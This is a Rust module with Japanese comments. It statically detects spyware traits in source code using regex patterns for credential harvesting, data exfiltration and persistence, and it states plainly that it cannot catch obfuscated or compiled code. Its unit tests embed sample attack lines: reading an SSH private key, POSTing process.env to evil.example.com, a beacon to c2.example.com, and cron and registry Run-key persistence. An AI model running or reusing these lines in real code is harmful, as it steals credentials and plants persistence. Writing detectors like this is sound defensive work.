//! スパイウェア挙動の静的検出。
//!
//! ユーザーの懸念:「無断で自動巡回しながら、自動で許可なく情報収集する」
//! ソフトウェア。これを**コードを実行する前に**静的に検出する。
//!
//! **正直な開示(最重要)**: これは常駐してプロセス/通信をリアルタイムに
//! 監視・遮断するもの**ではない**。ソース/スクリプトに「無断の情報収集・
//! 持ち出し」「常駐/自動起動の仕込み」「ビーコン的な定期外部通信」の
//! **兆候となるコードパターン**が書かれていないかを正規表現で調べるだけ。
//! 難読化・コンパイル済みバイナリ・実行時にしか現れない挙動は検出できない
//! (それらはOSのファイアウォール/EDR製品や[`crate::clamav`]の領域)。
//!
//! 検出は3カテゴリ:
//! 1. **無断の情報収集**(認証情報・鍵・ブラウザ保存情報・環境変数の読み取り)
//! 2. **持ち出し/外部送信**(収集したものを外部ホストへPOST/アップロード)
//! 3. **常駐・自動起動・自動巡回**(cron/systemd-timer/レジストリRun/
//!    スケジュールタスク/定期ビーコン)

use regex::Regex;

/// カテゴリ1: 無断の情報収集(センシティブなファイル・情報の読み取り)。
pub fn data_collection_patterns() -> Vec<(&'static str, Regex)> {
    vec![
        ("reads-ssh-private-key", Regex::new(r"(?i)\.ssh[/\\](id_rsa|id_ed25519|id_ecdsa|id_dsa)\b").unwrap()),
        ("reads-aws-credentials", Regex::new(r"(?i)\.aws[/\\]credentials\b").unwrap()),
        ("reads-cloud-or-netrc-creds", Regex::new(r"(?i)(\.netrc|\.docker[/\\]config\.json|gcloud[/\\][^\n]{0,40}credentials)").unwrap()),
        // ブラウザの保存パスワード/Cookie DB(スパイウェアの典型的な標的)。
        ("reads-browser-credential-store", Regex::new(r"(?i)(Login Data|cookies\.sqlite|Local State|key4\.db|logins\.json)\b").unwrap()),
        // 環境変数を丸ごと収集(認証トークンが含まれがち)。`regex`crateは
        // 先読みをサポートしないため、丸ごと収集の典型表現を列挙する
        // (単一変数アクセス`process.env.FOO`との区別は下の
        // exfiltrationパターン側で送信と併せて判定する)。
        (
            "harvests-all-environment-vars",
            Regex::new(r"(JSON\.stringify\(\s*process\.env|dict\(\s*os\.environ|os\.environ\.copy\(\)|Get-ChildItem\s+Env:|printenv\b)").unwrap(),
        ),
        // キーロガーの兆候。
        ("keylogger-hooks", Regex::new(r"(?i)(pynput[.\s]*keyboard|GetAsyncKeyState|SetWindowsHookEx[^\n]{0,40}WH_KEYBOARD|keylogger)").unwrap()),
        // クリップボード窃取。
        ("clipboard-theft", Regex::new(r"(?i)(pyperclip\.paste|Get-Clipboard|navigator\.clipboard\.readText)\b").unwrap()),
        // スクリーンショットの無断取得。
        ("screenshot-capture", Regex::new(r"(?i)(ImageGrab\.grab|mss\(\)|CopyFromScreen|screencapture\b)").unwrap()),
    ]
}

/// カテゴリ2: 収集した情報を外部へ持ち出す(exfiltration)。
pub fn exfiltration_patterns() -> Vec<(&'static str, Regex)> {
    vec![
        // 環境変数/ファイル内容を外部URLへPOST。
        ("posts-env-or-file-to-remote", Regex::new(r"(?is)(process\.env|os\.environ|readFileSync|open\([^\n]{0,40}\.env)[^\n]{0,200}(fetch|axios|requests\.(post|put)|urllib|http[s]?\.request|Invoke-RestMethod)").unwrap()),
        // 収集データをWebhook/チャットへ流す典型(Discord/Telegram等)。
        ("sends-to-webhook-or-bot", Regex::new(r"(?i)(discord(app)?\.com/api/webhooks|api\.telegram\.org/bot|hooks\.slack\.com/services)").unwrap()),
        // DNSトンネリング的な外部送信(サブドメインにデータを載せる)。
        ("dns-exfiltration-hint", Regex::new(r"(?i)(nslookup|dig)\s+[^\n]{0,40}\$\{?[A-Za-z_]").unwrap()),
        // ファイルを無断でアップロードするワンライナー。
        ("uploads-file-to-remote", Regex::new(r"(?i)curl[^\n]{0,80}(-F|--data-binary|-T)\s+[^\n]{0,80}https?://").unwrap()),
    ]
}

/// カテゴリ3: 常駐・自動起動・無断の自動巡回(persistence & beaconing)。
pub fn persistence_patterns() -> Vec<(&'static str, Regex)> {
    vec![
        // cron/at への自動巡回タスク登録。
        ("installs-cron-job", Regex::new(r"(?i)(crontab\s+-|/etc/cron\.(d|daily|hourly)|\bat\s+now\b)").unwrap()),
        // systemd timer / service を勝手に仕込む。
        ("installs-systemd-unit", Regex::new(r"(?i)(/etc/systemd/system/[^\n]{0,40}\.(service|timer)|systemctl\s+enable)").unwrap()),
        // Windowsの自動起動(レジストリRunキー)。
        ("windows-run-key-persistence", Regex::new(r"(?i)(CurrentVersion\\Run|reg\s+add[^\n]{0,80}\\Run)\b").unwrap()),
        // Windowsスケジュールタスクの無断作成。
        ("windows-scheduled-task", Regex::new(r"(?i)(schtasks\s+/create|Register-ScheduledTask)\b").unwrap()),
        // macOSのlaunchd常駐。
        ("macos-launchd-persistence", Regex::new(r"(?i)(LaunchAgents|LaunchDaemons)[/\\][^\n]{0,40}\.plist").unwrap()),
        // ビーコン: 一定間隔で外部ホストへ繰り返しアクセス(自動巡回)。
        ("periodic-beacon-to-remote", Regex::new(r"(?is)(setInterval|while\s+True|schedule\.every|for\s*\(;;\))[^\n]{0,200}(fetch|requests\.(get|post)|Invoke-WebRequest|http[s]?\.request)\([^\n]{0,80}https?://").unwrap()),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn matches_any(patterns: Vec<(&'static str, Regex)>, name: &str, sample: &str) -> bool {
        patterns.into_iter().find(|(n, _)| *n == name).map(|(_, re)| re.is_match(sample)).unwrap_or(false)
    }

    #[test]
    fn detects_ssh_private_key_read() {
        assert!(matches_any(data_collection_patterns(), "reads-ssh-private-key", "cat ~/.ssh/id_rsa"));
    }

    #[test]
    fn detects_browser_credential_theft() {
        assert!(matches_any(data_collection_patterns(), "reads-browser-credential-store", r#"open("Login Data")"#));
    }

    #[test]
    fn detects_env_exfiltration() {
        let code = "const data = process.env; fetch('https://evil.example.com', {method:'POST', body: JSON.stringify(data)})";
        assert!(matches_any(exfiltration_patterns(), "posts-env-or-file-to-remote", code));
    }

    #[test]
    fn detects_discord_webhook_exfiltration() {
        assert!(matches_any(exfiltration_patterns(), "sends-to-webhook-or-bot", "https://discord.com/api/webhooks/123/abc"));
    }

    #[test]
    fn detects_cron_persistence() {
        assert!(matches_any(persistence_patterns(), "installs-cron-job", "echo '* * * * * /tmp/x' | crontab -"));
    }

    #[test]
    fn detects_windows_run_key_persistence() {
        assert!(matches_any(persistence_patterns(), "windows-run-key-persistence", r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x"));
    }

    #[test]
    fn detects_periodic_beacon() {
        let code = "setInterval(() => { fetch('https://c2.example.com/beacon') }, 60000)";
        assert!(matches_any(persistence_patterns(), "periodic-beacon-to-remote", code));
    }

    #[test]
    fn clean_code_has_no_spyware_match() {
        let clean = "fn main() { println!(\"hello\"); }";
        for group in [data_collection_patterns(), exfiltration_patterns(), persistence_patterns()] {
            for (name, re) in group {
                assert!(!re.is_match(clean), "pattern {name} should not match clean code");
            }
        }
    }
}
